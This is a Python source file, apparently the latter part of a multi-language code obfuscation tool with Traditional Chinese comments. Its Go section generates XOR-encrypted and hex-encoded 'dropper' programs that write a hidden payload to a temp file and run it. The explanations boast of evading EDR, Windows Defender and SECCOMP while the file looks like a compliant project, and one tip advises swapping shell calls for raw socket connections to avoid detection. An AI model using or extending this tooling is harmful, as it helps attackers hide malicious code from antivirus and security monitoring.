            "微軟 Windows Defender 與 Linux SECCOMP 對二進位 system() 動態調用極為敏感，請優先考慮 System Call 替代方案。"
        ]
    }

# ==============================================================================
# 7. GO LANGUAGE OBFUSCATION (.go)
# ==============================================================================
def obfuscate_go(code: str) -> dict:
    xor_key = 0x3d
    xor_data = xor_encrypt(code, xor_key)
    hex_joined = ", ".join(xor_data['hex_array'])

    dropper_go = f"""package main

import (
	"io/ioutil"
	"os"
	"os/exec"
	"runtime"
)

func main() {{
	// 以位元 XOR 密封的原 Go 原始碼 payload
	payload := []byte{{
		{hex_joined},
	}}
	key := byte(0x{format(xor_key, 'x')})
	decrypted := make([]byte, len(payload))
	for i, b := range payload {{
		decrypted[i] = b ^ key
	}}

	tempFile := "temp_src.go"
	_ = ioutil.WriteFile(tempFile, decrypted, 0644)
	defer os.Remove(tempFile)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {{
		cmd = exec.Command("go", "run", tempFile)
	}} else {{
		cmd = exec.Command("go", "run", tempFile)
	}}

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	_ = cmd.Run()
}}"""

    xor_slice_go = """// 行內敏感 byte 切片動態還原法：
package main

import "fmt"

func decryptString(crypted []byte, key byte) string {
	res := make([]byte, len(crypted))
	for i, b := range crypted {
		res[i] = b ^ key
	}
	return string(res)
}

func main() {
	// e.g. XOR 加密後的帳密或 token 常數
	c := []byte{0x7a, 0x76, 0x7e, 0x7c, 0x63, 0x6a}
	fmt.Println(decryptString(c, 0x1d))
}"""

    go_hexes = "".join([f"\\\\x{format(ord(c), '02x')}" for c in code])
    hex_reflector_go = f"""package main

import (
	"io/ioutil"
	"os"
	"os/exec"
)

func main() {{
	// 使用 Go 原生支援的 \\x 十六進位字元串字面值轉義，不保留任何明文，編譯後 strings 提取無效
	src := "{go_hexes}"
	_ = ioutil.WriteFile("temp_exec.go", []byte(src), 0644)
	defer os.Remove("temp_exec.go")
	_ = exec.Command("go", "run", "temp_exec.go").Run()
}}"""

    replacements = []
    if "exec.Command" in code:
        replacements.append({
            "originalCommand": "exec.Command(\"sh\", \"-c\", ...)",
            "suggestedReplacement": "Go Standard Network Libraries (net.Dial)",
            "reason": "使用 exec.Command 呼叫本機 shell 是外部阻絕的頭號特徵（如被 SECCOMP、SELinux 限制）。請儘量以 Go 內建的高效多功能網卡和 socket 庫實現數據拉取或發送。",
            "compatibleCode": "conn, err := net.Dial(\"tcp\", \"10.0.0.1:8080\")"
        })

    return {
        "options": [
            {
                "methodName": "Go run 實時動態編譯 (Go Dropper)",
                "obfuscatedCode": dropper_go,
                "explanation": "將您的 Go 代碼 XOR 加密為 byte 數組。在宿主端運行時自適應檢測 runtime GOOS 平台，釋放為快閃檔案臨時呼叫本機 go run SDK 編譯執行。外表為合規項目，本體功能代碼完美逃逸。",
                "pros": ["靜態反彙編下看不到任何 Go 原生的關鍵 package、方法 or API 交互文字"],
                "cons": ["要求被部署的宿主主機上必須原生安裝有 Go SDK，限制了一般部署"]
            },
            {
                "methodName": "Go 記憶體 Byte XOR (Byte Slice XOR)",
                "obfuscatedCode": xor_slice_go,
                "explanation": "本方案符合 Go 開發標準：將您代碼中硬編碼的敏感 API 域名、密鑰或認證 token 轉換成 XOR 加密位元。在調用時即時進行 byte 還原。這既不損耗效能，也保留了 Go 對跨平台直接交叉編譯（cross-compilation）二編譯二進位單個文件發佈的一流優勢。",
                "pros": ["不依赖宿主裝載 Go 編譯器，完美支援常規安全靜態編譯交付"],
                "cons": ["僅對字串常量部分做 XOR， functional 邏輯程式架構依然可以被靜態分析器檢出"]
            },
            {
                "methodName": "字串區塊 Hex 反射載入 (Hex Reflector)",
                "obfuscatedCode": hex_reflector_go,
                "explanation": "利用 Go 語言原生對 \\x 編碼轉義序列的優秀編譯期編譯優勢，將您的 Go 代碼整段轉化為一行式 Hex 字面值字串。編譯出來的 Go 靜態 binary 進程將完全清除所有可讀的代碼、路徑和文字特徵，直接對抗高級 EDR 及靜態日誌分析儀。",
                "pros": ["不依賴任何運行期解碼函數（如 XOR 或 Base64 軟解碼），藉由 Go 直譯器編譯時的自動內部轉換還原性能，效能極高", "零敏感資訊洩露"],
                "cons": ["對宿主機上 Go SDK 仍有相依性"]
            }
        ],
        "replacements": replacements,
        "warnings": [
            "請確保在需要交叉編譯交付時選擇【方案 B】。Dropper 方案只適合有 Go SDK 工具鏈的可開發調試主機。"
        ]
    }

# ==============================================================================
# 核心調度配對引擎
# ==============================================================================
def obfuscate_code(code: str, shell: str) -> dict:
    shell = shell.lower()
    if shell == "batch" or shell == "bat" or shell == "cmd":
        return obfuscate_batch(code)
    elif shell == "powershell" or shell == "ps1" or shell == "pwsh":
        return obfuscate_powershell(code)
    elif shell == "bash" or shell == "sh":
        return obfuscate_bash(code)
    elif shell == "python" or shell == "py":
        return obfuscate_python(code)
    elif shell == "javascript" or shell == "js" or shell == "node":
        return obfuscate_javascript(code)
    elif shell == "c":
        return obfuscate_c(code)
    elif shell == "go" or shell == "golang":
        return obfuscate_go(code)
    else:
        return obfuscate_bash(code)

# ==============================================================================
# 互動式 CLI 菜單
# ==============================================================================
def run_interactive_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_color("=" * 64, Colors.CYAN)
        print_color("   🛡️  Windows / Linux 終端等多平台代碼混淆與相容性檢測工具 🛡️", Colors.BOLD + Colors.CYAN)
        print_color("=" * 64, Colors.CYAN)
        print_color("本工具支持 7 種主流腳本和程式語言的多重功能等效混淆手法。", Colors.DARK_GRAY)
        print_color("混淆代碼在維持原本運作功能的同時，能有效防範靜態字串掃描分析。", Colors.DARK_GRAY)
        print_color("-" * 64, Colors.DARK_GRAY)
        
        print_color("請選擇目標腳本語言學派：", Colors.BOLD + Colors.BLUE)
        print("  [1] Windows PowerShell (.ps1)")
        print("  [2] Windows CMD / Batch (.bat)")
        print("  [3] Linux Bash (.sh)")
        print("  [4] Python (.py)")
        print("  [5] JavaScript / Node.js (.js)")
        print("  [6] C 語言 (.c)")
        print("  [7] Go 語言 (.go)")
        print("  [0] 離開工具")
        print_color("-" * 64, Colors.DARK_GRAY)
        
        choice = input("請輸入序號 [0-7]: ").strip()
        if choice == "0":
            print_color("\n感謝使用本工具，安全編譯，守護原始碼！\n", Colors.GREEN)
            break
            
        lang_map = {
            "1": ("powershell", "PowerShell (.ps1)"),
            "2": ("batch", "Windows CMD (.bat)"),
            "3": ("bash", "Linux Bash (.sh)"),
            "4": ("python", "Python (.py)"),
            "5": ("javascript", "JavaScript (.js)"),
            "6": ("c", "C 語言 (.c)"),
            "7": ("go", "Go 語言 (.go)"),
        }
        
        if choice not in lang_map:
            input("\n序號無效，請按 Enter 鍵重新輸入...")
            continue
            
        shell_val, name_val = lang_map[choice]
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print_color(f"=== 操作對象: {name_val} ===", Colors.HEADER + Colors.BOLD)
        print_color("請輸入或貼上您要進行混淆的原始代碼 (請以行末輸入 EOF 或按 Ctrl+D 結束輸入)：", Colors.BLUE)
        print_color("-" * 50, Colors.DARK_GRAY)
        
        lines = []
        while True:
            try:
                line = input()
                if line.strip() == "EOF":
                    break
                lines.append(line)
            except EOFError:
                break
                
        raw_code = "\n".join(lines)
        if not raw_code.strip():
            print_color("\n⚠️ 輸入的代碼不可為空！", Colors.WARNING)
            input("按 Enter 鍵返回...")
            continue
            
        try:
            result = obfuscate_code(raw_code, shell_val)
            display_results(result, raw_code)
        except Exception as e:
            print_color(f"\n❌ 混淆過程中發生錯誤: {e}", Colors.FAIL)
            input("按 Enter 鍵返回...")

def display_results(result, raw_code):
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_color("=" * 64, Colors.CYAN)
        print_color("               ✨ 程式碼等效等多態自適應混淆方案已完成 ✨", Colors.BOLD + Colors.GREEN)
        print_color("=" * 64, Colors.CYAN)
        
        options = result["options"]
        print_color("目前已為您生成以下幾組不同的自適應防禦混淆手法：", Colors.BLUE)
        for idx, opt in enumerate(options):
            print(f"  [{idx + 1}] {opt['methodName']}")
            
        print_color("\n額外操作：", Colors.DARK_GRAY)
        print("  [R] 檢視敏感代碼 / 高安全防禦替代方案與說明 (Replacements)")
        print("  [W] 檢視跨平台安全執行警告與環境設定 (Warnings)")
        print("  [B] 返回主選單")
        
        sub_choice = input("\n請選擇檢視或複製的方案代碼 [1-{} / R / W / B]: ".format(len(options))).strip().upper()
        
        if sub_choice == "B":
            break
        elif sub_choice == "R":
            show_replacements(result.get("replacements", []))
        elif sub_choice == "W":
            show_warnings(result.get("warnings", []))
        else:
            try:
                num = int(sub_choice) - 1
                if 0 <= num < len(options):
                    show_option_detail(options[num])
                else:
                    input("輸入超出範圍，按 Enter 鍵重新輸入...")
            except ValueError:
                input("輸入無效，按 Enter 鍵重新輸入...")

def show_option_detail(option):
    os.system('cls' if os.name == 'nt' else 'clear')
    print_color(f"=== 混淆手法: {option['methodName']} ===", Colors.CYAN + Colors.BOLD)
    print_color("\n【原理詳細繁體中文解析】:", Colors.BLUE)
    print(option['explanation'])
    
    print_color("\n【✅ 優勢推薦 (PROS)】:", Colors.GREEN)
    for p in option.get('pros', []):
        print(f"  - {p}")
        
    print_color("\n【⚠️ 限制與防禦說明 (CONS)】:", Colors.WARNING)
    for c in option.get('cons', []):
        print(f"  - {c}")
        
    print_color("\n" + "=" * 50 + " 混淆代碼內容 " + "=" * 50, Colors.DARK_GRAY)
    print_color(option['obfuscatedCode'], Colors.BOLD)
    print_color("=" * 114, Colors.DARK_GRAY)
    
    # 儲存選項到檔案
    save_opt = input("\n是否將此方案的混淆代碼保存至檔案？ (Y/N): ").strip().lower()
    if save_opt == 'y' or save_opt == 'yes':
        filename = input("請輸入要保存的檔案路徑/名稱 (例如 payload_obf.txt): ").strip()
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(option['obfuscatedCode'])
                print_color(f"\n✅ 檔案已成功寫入：{filename}", Colors.GREEN)
                input("\n按 Enter 鍵繼續...")
            except Exception as e:
                print_color(f"\n❌ 寫入檔案失敗: {e}", Colors.FAIL)
                input("\n按 Enter 鍵繼續...")
    else:
        input("\n按 Enter 鍵返回上一級...")

def show_replacements(reps):
    os.system('cls' if os.name == 'nt' else 'clear')
    print_color("=== 🔄 敏感或禁用的指令 / 跨平台等效替代方案 (Replacements) ===", Colors.HEADER + Colors.BOLD)
    
    if not reps:
        print("\n本段原始碼中未檢測出明顯在特定受限環境易受阻或被防毒干擾之高危命令。")
    else:
        for idx, r in enumerate(reps):
            print_color(f"\n[{idx + 1}] 高危特徵項目 / 原代碼句：{r['originalCommand']}", Colors.BOLD + Colors.FAIL)
            print_color(f"    🌟 推薦相容新方案：{r['suggestedReplacement']}", Colors.GREEN)
            print_color(f"    ℹ️ 相容運作原因：{r['reason']}", Colors.DARK_GRAY)
            print_color(f"    💻 等效可執行代碼：\n{r['compatibleCode']}", Colors.BLUE)
            print("-" * 64)
            
    input("\n按 Enter 鍵返回...")

def show_warnings(warnings):
    os.system('cls' if os.name == 'nt' else 'clear')
    print_color("=== ⚠️ 跨平台安全執行警告與環境設定 (Warnings) ===", Colors.WARNING + Colors.BOLD)
    
    if not warnings:
        print("\n目前無額外特別注意事宜，正常兼容運行即可。")
    else:
        for idx, w in enumerate(warnings):
            print(f"  [{idx + 1}] {w}")
            
    input("\n按 Enter 鍵返回...")

# ==============================================================================
# 命令行参数解析
# ==============================================================================
def main():
    import argparse
    parser = argparse.ArgumentParser(description="🛡️ Windows / Linux 終端多平台代碼混淆與安全替代工具 - Python CLI 版")
    parser.add_argument("-s", "--shell", type=str, choices=["batch", "powershell", "bash", "python", "javascript", "c", "go"],
                        help="指定腳本或程式語言類別")
    parser.add_argument("-i", "--input", type=str, help="輸入要混淆的代碼 (可傳代碼字串，若為現有檔案路徑則讀取該檔案)")
    parser.add_argument("-o", "--output", type=str, help="混淆後輸出的檔案路徑")
    parser.add_argument("-m", "--method", type=int, default=1, help="當非互動模式時，指定採用第幾個混淆方法 (預設為 1)")
    
    args = parser.parse_args()
    
    # 若不帶任何引數，進入精美的互動 TUI 菜單
    if len(sys.argv) == 1:
        run_interactive_menu()
        return
        
    if not args.shell:
        print_color("錯誤：缺少 --shell / -s 參數，必須指定程式語言類型。", Colors.FAIL)
        return
        
    if not args.input:
        print_color("錯誤：缺少 --input / -i 參數，必須指定輸入的腳本內容或代碼檔路徑。", Colors.FAIL)
        return
        
    # 讀取代碼
    raw_code = ""
    if os.path.exists(args.input):
        try:
            with open(args.input, "r", encoding="utf-8", errors="replace") as f:
                raw_code = f.read()
        except Exception as e:
            print_color(f"讀取輸入檔案錯誤: {e}", Colors.FAIL)
            return
    else:
        raw_code = args.input
        
    if not raw_code.strip():
        print_color("錯誤：輸入代碼為空。", Colors.FAIL)
        return
        
    # 執行混淆
    try:
        result = obfuscate_code(raw_code, args.shell)
        options = result["options"]
        method_idx = args.method - 1
        
        if method_idx < 0 or method_idx >= len(options):
            print_color(f"警告：選擇的方法導航 index [{args.method}] 不存在。採用第 1 個方案。", Colors.WARNING)
            method_idx = 0
            
        selected_opt = options[method_idx]
        obfuscated_output = selected_opt["obfuscatedCode"]
        
        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as out_f:
                    out_f.write(obfuscated_output)
                print_color(f"✅ 混淆成功！已將代碼寫入至：{args.output}", Colors.GREEN)
            except Exception as e:
                print_color(f"寫入輸出檔案失敗: {e}", Colors.FAIL)
        else:
            # 直接在終端輸出
            print_color(f"=== 手法: {selected_opt['methodName']} ===", Colors.CYAN + Colors.BOLD)
            print(obfuscated_output)
            print_color("======================================", Colors.DARK_GRAY)
            
    except Exception as e:
        print_color(f"混淆處理失敗: {e}", Colors.FAIL)

if __name__ == "__main__":
    main()
